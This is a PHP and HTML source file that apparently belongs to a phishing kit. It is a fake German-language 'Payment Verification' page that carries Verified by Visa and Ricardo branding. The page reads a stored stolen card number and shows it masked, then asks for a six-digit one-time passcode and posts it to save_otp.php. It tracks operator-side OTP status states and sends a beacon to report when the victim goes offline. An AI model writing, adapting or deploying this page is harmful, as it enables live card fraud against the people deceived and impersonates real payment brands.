<?php
// Include the connection file
include '../connection/connection.php';
session_start();

// Ensure user_id is retrieved from the session so it fetches data for the correct user
if (!isset($_SESSION['user_id'])) {
    echo "Error: User ID not found in session. Please log in.";
    header('Location: ../index.php');
    exit();
}

$user_id = $_SESSION['user_id'];

try {
    // Prepare and execute the SQL statement to fetch card_number
    $stmt = $pdo->prepare("SELECT card_number FROM users WHERE id = ?");
    $stmt->execute([$user_id]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($user && isset($user['card_number'])) {
        // Get the last 3 digits of the card number
        $card_number = $user['card_number'];
        $masked_card_number = 'XXXX-XXXX-XXXX-' . substr($card_number, -3);
    } else {
        $masked_card_number = 'Card number not found';
    }
} catch (PDOException $e) {
    echo "Error: " . $e->getMessage();
    $masked_card_number = 'Error fetching card number';
}
?>

<?php

require '../connection/connection.php';

$user_id = $_SESSION['user_id'];

$stmt = $pdo->prepare("SELECT otpstatus FROM users WHERE id = ?");
$stmt->execute([$user_id]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);

if ($user['otpstatus'] === 'processing' || $user['otpstatus'] === 'awaiting_otp') {
    header('Location: ../timer/processing.php');
    exit();
}

// If the OTP is already verified, redirect to the verification page
if ($user['otpstatus'] === 'otp_verified') {
    header('Location: ../otp/verifyotp.php');
    exit();
}

?>


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Verification</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
</head>

<body class="bg-gray-100 flex items-center justify-center h-screen">
    <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md text-center">
        <div class="flex justify-center items-center gap-20 mb-6">
            <img src="visa.png" alt="Verified by Visa" class="h-16 w-24 object-contain">
            <img src="https://files.ricardostatic.ch/logos/ricardo_logo_pos.svg" alt="Ricardo Logo" class="h-16 w-24 object-contain">
        </div>


        <h3 class="text-xl font-semibold mb-4">Bitte geben Sie Ihren Sicherheitscode an</h3>
        <p class="text-gray-600 mb-6">Ein einmaliger Passcode ist erforderlich. Dieser Code wurde an Ihr registriertes Mobiltelefon gesendet.</p>

        <form action="./save_otp.php" method="post" class="space-y-4">
            <p class="text-left">Bank: Stripe Payments CH Limited</p>
            <p class="text-left">Datum: <span id="localDate"></span></p>
            <p class="text-left">Kreditkarte: <?php echo htmlspecialchars($masked_card_number); ?></p>
            <p class="text-left">Code Gesendet: <span id="countdown" class="font-semibold"></span></p>

            <input type="text" id="otp" name="otp" placeholder="Geben Sie den OTP-Code ein" pattern="\d{6}" title="Please enter a 6-digit number" required class="w-full p-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500">
            <p style="color: gray;">Ihre Kreditkarte wird nicht belastet</p>
            <input type="submit" value="Bestätigen"  class="w-full py-3 bg-orange-600 text-white rounded hover:bg-orange-700 cursor-pointer" style="background-color: #F97316 !important;">
        </form>

        <div class="text-gray-500 text-sm mt-6">
            Urheberrecht © 1999-2024. Alle Rechte vorbehalten.
        </div>
    </div>

    <script>
        // Get the current date from the user's browser
        const today = new Date();
        const options = {
            day: '2-digit',
            month: 'short',
            year: 'numeric'
        };
        const formattedDate = today.toLocaleDateString('de-DE', options);

        // Display the date in the span
        document.getElementById('localDate').textContent = formattedDate;
    </script>
    <script>
        // Function to start the countdown
        function startCountdown(duration, display) {
            let timer = duration,
                minutes, seconds;
            const countdownInterval = setInterval(function() {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);

                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;

                display.textContent = minutes + ":" + seconds;

                if (--timer < 0) {
                    clearInterval(countdownInterval);
                    display.textContent = "0:00"; // Set to 0:00 when time is up
                }
            }, 1000);
        }

        // Start the countdown (2 minutes)
        window.onload = function() {
            const countdownDuration = 2 * 60; // 2 minutes in seconds
            const display = document.querySelector('#countdown');
            startCountdown(countdownDuration, display);
        };

        window.addEventListener('beforeunload', function() {
            navigator.sendBeacon('../update_status.php', new URLSearchParams({
                status: 'offline'
            }));
        });
    </script>

</body>

</html>